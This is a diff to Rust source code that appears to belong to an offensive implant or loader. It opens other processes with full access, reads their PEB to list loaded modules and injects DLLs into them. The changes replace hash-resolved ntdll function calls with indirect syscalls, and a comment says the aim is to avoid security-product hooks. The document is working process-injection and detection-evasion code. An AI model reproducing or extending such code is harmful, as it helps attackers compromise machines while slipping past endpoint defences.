@@ -45,9 +45,6 @@ const PAGE_EXECUTE_READWRITE: u32 = 0x40;
 /// Maximum number of modules to enumerate when scanning for loaded DLLs.
 const MAX_MODULES: usize = 1024;
 
-/// Path buffer size for remote DLL path write.
-const MAX_PATH_W: usize = 520;
-
 // ── PE header types (minimal, for parsing) ───────────────────────────────────
 
 #[repr(C)]
@@ -300,14 +297,7 @@ unsafe fn enumerate_remote_modules(
     let mut peb_ldr_offset: usize = 0x18; // Offset of Ldr in PEB64
     let mut ldr_ptr: usize = 0;
 
-    // Resolve NtReadVirtualMemory
-    let ntdll_mod = ntdll;
-    let ntrvm = pe_resolve::get_proc_address_by_hash(
-        ntdll_mod,
-        pe_resolve::hash_str(b"NtReadVirtualMemory\0"),
-    )
-    .ok_or_else(|| anyhow!("cannot resolve NtReadVirtualMemory"))?;
-
+    // Resolve NtReadVirtualMemory via indirect syscall
     let target = crate::syscalls::get_syscall_id("NtReadVirtualMemory");
 
     // Helper: read usize from target process
@@ -558,7 +548,7 @@ unsafe fn load_dll_remote(
             &[
                 thread_handle as u64, // Handle
                 0,                    // Alertable (FALSE)
-                i64::MIN as u64,      // Timeout (INFINITE = -100000000ns, use max for simplicity)
+                (-1i64) as u64,      // Timeout (INFINITE = -1 as signed i64)
             ],
         );
     }
@@ -963,20 +953,7 @@ pub unsafe fn phase1_load(
     let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
         .ok_or_else(|| anyhow!("cannot resolve ntdll"))?;
 
-    let open_process_fn = pe_resolve::get_proc_address_by_hash(
-        ntdll,
-        pe_resolve::hash_str(b"NtOpenProcess\0"),
-    )
-    .ok_or_else(|| anyhow!("cannot resolve NtOpenProcess"))?;
-
-    let ntopen: extern "system" fn(
-        *mut usize,     // ProcessHandle
-        u32,            // DesiredAccess
-        *mut c_void,    // ObjectAttributes
-        *mut c_void,    // ClientId
-    ) -> i32 = std::mem::transmute(open_process_fn);
-
-    // Build CLIENT_ID
+    // NtOpenProcess via indirect syscall (avoids ntdll IAT hook)
     #[repr(C)]
     struct ClientId {
         unique_process: usize,
@@ -988,14 +965,22 @@ pub unsafe fn phase1_load(
     };
 
     let mut process_handle: usize = 0;
-    let status = ntopen(
-        &mut process_handle,
-        PROCESS_ALL_ACCESS,
-        std::ptr::null_mut(),
-        &cid as *const _ as *mut c_void,
-    );
-    if status < 0 || process_handle == 0 {
-        return Err(anyhow!("NtOpenProcess failed: {status:#x}"));
+    {
+        let target = get_syscall_id("NtOpenProcess")
+            .map_err(|e| anyhow!("NtOpenProcess SSN resolution: {e}"))?;
+        let status = do_syscall(
+            target.ssn,
+            target.gadget_addr,
+            &[
+                &mut process_handle as *mut _ as u64,
+                PROCESS_ALL_ACCESS as u64,
+                std::ptr::null_mut::<c_void>() as u64, // ObjectAttributes
+                &cid as *const _ as *mut c_void as u64,
+            ],
+        );
+        if status < 0 || process_handle == 0 {
+            return Err(anyhow!("NtOpenProcess failed: {status:#x}"));
+        }
     }
 
     // Enumerate currently loaded modules
